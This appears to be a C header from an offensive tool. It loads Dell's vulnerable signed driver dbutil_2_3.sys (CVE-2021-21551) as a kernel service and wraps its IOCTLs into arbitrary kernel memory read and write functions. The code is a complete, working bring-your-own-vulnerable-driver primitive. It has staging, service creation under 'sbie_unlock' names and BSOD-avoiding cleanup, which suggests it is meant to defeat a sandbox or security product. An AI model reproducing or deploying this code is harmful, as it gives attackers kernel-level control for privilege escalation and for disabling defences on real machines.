/*
 * kdrv.h - kernel R/W primitive via dbutil_2_3.sys (CVE-2021-21551)
 *
 * Loads the Dell-signed driver as a service, opens the device, and
 * provides virtual kernel memory read/write through IOCTLs.
 *
 * The driver binary is staged by version_hook.c to a temp file and
 * passed in via kdrv_load.  The device name is hardcoded in the driver.
 *
 * Never stop/delete the service while the driver is live (causes BSOD).
 * Just close handles — stale service is cleaned on next load after reboot.
 */
#ifndef KDRV_H
#define KDRV_H

#include <windows.h>
#include <winioctl.h>
#include "log.h"
#include "driver_bin.h"

/* Device name is hardcoded in the driver, independent of service name. */
#define KDRV_DEVICE   L"\\\\.\\DBUtil_2_3"

/* IOCTLs from reverse-engineering sub_11170 in dbutil_2_3.sys. */
#define KDRV_IOCTL_R  0x9B0C1EC4   /* memcpy read  (sub_15294, a2=0) */
#define KDRV_IOCTL_W  0x9B0C1EC8   /* memcpy write (sub_15294, a2=1) */
#define KDRV_HDR      24           /* 3 x uint64: cookie, base, offset */

typedef struct {
    SC_HANDLE hScm;
    SC_HANDLE hSvc;
    HANDLE    hDev;
    char      driverPath[MAX_PATH];  /* staging path (temp file) */
} kdrv_t;

/* Unique service name per process to avoid stale service conflicts. */
static char g_svc_name[64];

/* ------------------------------------------------------------------ */

/* Read *size* bytes from kernel virtual address *va*. Returns 0 on success. */
static int kdrv_read(kdrv_t *d, ULONG64 va, void *out, ULONG size)
{
    ULONG bufLen = KDRV_HDR + size;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!buf) return 1;

    *(ULONG64 *)(buf + 0)  = 0;   /* cookie = 0 (check skipped) */
    *(ULONG64 *)(buf + 8)  = va;
    *(ULONG64 *)(buf + 16) = 0;

    ULONG returned = 0;
    BOOL ok = DeviceIoControl(d->hDev, KDRV_IOCTL_R, buf, bufLen,
                              buf, bufLen, &returned, NULL);
    if (!ok || returned < KDRV_HDR + size) {
        HeapFree(GetProcessHeap(), 0, buf);
        return 2;
    }
    memcpy(out, buf + KDRV_HDR, size);
    HeapFree(GetProcessHeap(), 0, buf);
    return 0;
}

/* Write *data* to kernel virtual address *va*. Returns 0 on success. */
static int kdrv_write(kdrv_t *d, ULONG64 va, const void *data, ULONG size)
{
    ULONG bufLen = KDRV_HDR + size;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!buf) return 1;

    *(ULONG64 *)(buf + 0)  = 0;
    *(ULONG64 *)(buf + 8)  = va;
    *(ULONG64 *)(buf + 16) = 0;
    memcpy(buf + KDRV_HDR, data, size);

    ULONG returned = 0;
    BOOL ok = DeviceIoControl(d->hDev, KDRV_IOCTL_W, buf, bufLen,
                              buf, bufLen, &returned, NULL);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok ? 0 : 2;
}

/* Try to open the device if the driver is already running. */
static BOOL kdrv_try_open_device(kdrv_t *d)
{
    d->hDev = CreateFileW(KDRV_DEVICE, GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (d->hDev != INVALID_HANDLE_VALUE)
        return TRUE;
    d->hDev = NULL;
    return FALSE;
}

/* Delete a stale service if it's STOPPED. RUNNING services are left
 * alone (device is reused via fast path). */
static void kdrv_cleanup_stale(SC_HANDLE hScm)
{
    SC_HANDLE hOld = OpenServiceA(hScm, g_svc_name, SERVICE_ALL_ACCESS);
    if (!hOld) return;

    SERVICE_STATUS st;
    if (QueryServiceStatus(hOld, &st) && st.dwCurrentState == SERVICE_STOPPED) {
        DeleteService(hOld);
        Sleep(300);
    }
    CloseServiceHandle(hOld);
}

/* Discard the service just created by the failed load attempt.  Only a
 * STOPPED service is deleted — the driver never loaded, so this is safe
 * and prevents per-run service litter in SCM.  A RUNNING service is left
 * alone (its driver is live; device reuse via fast path on next run). */
static void kdrv_discard_service(kdrv_t *d)
{
    if (d->hSvc) {
        SERVICE_STATUS st;
        if (QueryServiceStatus(d->hSvc, &st) && st.dwCurrentState == SERVICE_STOPPED)
            DeleteService(d->hSvc);
        CloseServiceHandle(d->hSvc);
        d->hSvc = NULL;
    }
    if (d->hScm) {
        CloseServiceHandle(d->hScm);
        d->hScm = NULL;
    }
}

/* Verify that the file at path contains exactly the embedded driver bytes.
 * Called right before CreateService to close the swap race on
 * user-writable staging paths. */
static BOOL kdrv_verify_driver_file(const char *path)
{
    HANDLE hFile = CreateFileA(path, GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        LOGE("Verify driver file: open failed: %lu path=%s", GetLastError(), path);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize != g_driver_size) {
        CloseHandle(hFile);
        LOGW("Verify driver file: size %lu != expected %lu", fileSize, g_driver_size);
        return FALSE;
    }

    BOOL ok = FALSE;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (buf) {
        DWORD bytesRead = 0;
        if (ReadFile(hFile, buf, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
            ok = (memcmp(buf, g_driver_bin, fileSize) == 0);
        HeapFree(GetProcessHeap(), 0, buf);
    }
    CloseHandle(hFile);
    return ok;
}

/* Load the driver: opens device if already running, otherwise creates
 * a service and starts it.  The driver file must already exist at the
 * staging path produced by extract_driver.  Returns 0 on success. */
static int kdrv_load(kdrv_t *d, const char *driver_path)
{
    memset(d, 0, sizeof(*d));

    /* Fast path: device already exists from a prior run */
    if (kdrv_try_open_device(d))
        return 0;

    /* Unique service name per process */
    wsprintfA(g_svc_name, "sbie_unlock_%lu", GetCurrentProcessId());

    /* Driver path comes from extract_driver (temp staging) */
    if (!driver_path || !driver_path[0]) {
        LOGE("No driver path supplied — extract_driver must run first");
        return 1;
    }
    strcpy_s(d->driverPath, MAX_PATH, driver_path);

    if (GetFileAttributesA(d->driverPath) == INVALID_FILE_ATTRIBUTES) {
        LOGE("Driver file not found: %s", d->driverPath);
        return 1;
    }

    /* Verify the file on disk exactly matches the embedded driver right
     * before loading — closes the swap race on writable staging paths */
    if (!kdrv_verify_driver_file(d->driverPath)) {
        LOGE("Driver file content verification failed: %s", d->driverPath);
        return 6;
    }

    d->hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!d->hScm) {
        LOGE("OpenSCManager failed: %lu", GetLastError());
        return 2;
    }

    kdrv_cleanup_stale(d->hScm);

    d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                             SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                             d->driverPath, NULL, NULL, NULL, NULL, NULL);
    if (!d->hSvc) {
        DWORD err = GetLastError();
        LOGE("CreateService failed: %lu", err);
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            Sleep(1000);
            d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                                     SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                     SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                     d->driverPath, NULL, NULL, NULL, NULL, NULL);
        }
        if (!d->hSvc) {
            CloseServiceHandle(d->hScm);
            d->hScm = NULL;
            return 3;
        }
    }

    if (!StartServiceA(d->hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        LOGE("StartService failed: 0x%lX (%lu) svc=%s", err, err, g_svc_name);
        if (err == ERROR_ALREADY_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            if (kdrv_try_open_device(d)) return 0;
            Sleep(2000);
            if (kdrv_try_open_device(d)) return 0;
        }
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            kdrv_discard_service(d);
            return 4;
        }
    }

    /* Wait for device to appear */
    for (int i = 0; i < 20; i++) {
        if (kdrv_try_open_device(d))
            return 0;
        Sleep(100);
    }
    kdrv_discard_service(d);
    return 5;
}

/* Unload: close handles only. Never stop/delete while live (BSOD risk). */
static void kdrv_unload(kdrv_t *d)
{
    if (d->hDev) { CloseHandle(d->hDev); d->hDev = NULL; }
    if (d->hSvc) { CloseServiceHandle(d->hSvc); d->hSvc = NULL; }
    if (d->hScm) { CloseServiceHandle(d->hScm); d->hScm = NULL; }
    /* Temp file cleanup is handled by cleanup_stale_temp_drivers on the
     * next run (the mapped image locks the file until reboot). */
}

#endif /* KDRV_H */
